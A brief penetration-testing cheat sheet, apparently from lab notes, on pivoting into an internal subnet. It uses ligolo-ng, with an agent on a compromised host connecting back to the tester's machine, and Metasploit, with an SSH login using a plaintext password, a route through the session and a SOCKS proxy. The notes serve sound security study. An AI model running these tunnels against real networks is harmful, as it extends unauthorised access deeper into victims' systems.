## Ligolo-ng [GUIDE](https://software-sinner.medium.com/how-to-tunnel-and-pivot-networks-using-ligolo-ng-cf828e59e740)
##### Setup `tun` interface
```sh
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
```

##### Local machine
```sh
./ligolo-proxy -selfcert -laddr 0.0.0.0:6666
```

##### On remote box
```sh
./ligolo-agent -connect LOCAL_IP:6666 -ignore-cert
```

##### On local machine, add the subnet you want to pivot to
```sh
sudo ip route add 172.16.1.0/24 dev ligolo
```

##### On ligolo-ng proxy on LOCAL
```sh
session
start
```



## Metasploit (slow af)
#### Connect with ssh
```
use auxiliary/scanner/ssh/ssh_login
set rhosts 10.10.110.100
set username balthazar
set password TheJoker12345!
exploit
```

#### Add route
The subnet is the network where we want to pivot to, which is only visible from inside the entrypoint machine
```
command arg subnet netmask session
```

```
route add 172.16.1.0 255.255.255.0 1
```

#### Create socks proxy
```
use auxiliary/server/socks_proxy
set srvport 1337
run -j
```